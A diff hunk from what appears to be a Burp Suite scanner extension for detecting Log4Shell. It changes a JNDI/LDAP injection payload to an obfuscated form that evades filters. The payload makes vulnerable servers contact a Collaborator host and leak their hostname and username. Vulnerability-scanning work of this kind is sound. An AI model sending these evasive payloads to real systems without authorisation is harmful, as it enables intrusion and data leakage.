@@ -69,7 +69,7 @@ class BurpExtender : IBurpExtender, IScannerCheck, IExtensionStateListener {
         val collabResults = mutableListOf<IBurpCollaboratorInteraction>()
         for ((prefix, key) in listOf(Pair(QUERY_HOSTNAME, "hostName"), Pair(QUERY_HOSTUSER, "hostName}-s2u-\${env:USERNAME:-\${env:USER}"))) {
             val payload = collaborator.generatePayload(false)
-            val bytes = "\${jndi:ldap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
+            val bytes = "\${\${lower:j}ndi:\${lower:L}dap://$prefix\${$key}.$payload.${collaborator.collaboratorServerLocation}/s2test}".toByteArray()
             val request = insertionPoint!!.buildRequest(bytes)
             val poff = insertionPoint.getPayloadOffsets(bytes)
             val hs = baseRequestResponse!!.httpService
